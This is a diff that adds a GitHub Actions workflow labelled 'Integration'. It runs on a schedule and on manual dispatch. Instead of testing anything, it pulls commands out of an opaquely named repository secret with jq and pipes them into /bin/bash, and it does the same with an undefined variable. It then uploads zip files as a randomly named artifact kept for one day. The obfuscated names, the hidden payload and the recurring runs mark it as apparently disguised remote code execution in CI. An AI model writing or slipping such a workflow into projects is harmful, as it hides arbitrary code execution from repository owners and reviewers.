@@ -1,0 +1,29 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '59 0,6,12,18 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          st079: ${{ secrets.st079 }}
+        run: |
+          printf '%s' "$st079" | jq -r .dxagp71704 | /bin/bash
+          printf '%s' "$j8" | jq -r .lv7536 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: wPazgjXo
+          path: "*.zip"
+          retention-days: 1
